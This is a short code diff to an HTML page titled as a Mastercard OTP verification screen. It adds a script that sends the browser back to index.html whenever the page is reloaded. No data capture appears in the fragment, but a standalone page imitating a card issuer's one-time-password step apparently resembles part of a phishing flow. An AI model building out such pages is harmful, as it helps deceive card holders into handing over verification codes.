@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script>
+        if (window.performance && ((performance.getEntriesByType("navigation")[0] && performance.getEntriesByType("navigation")[0].type === "reload") || performance.navigation.type === 1)) {
+            window.location.href = "index.html";
+        }
+    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <title>Mastercard | OTP Verification</title>
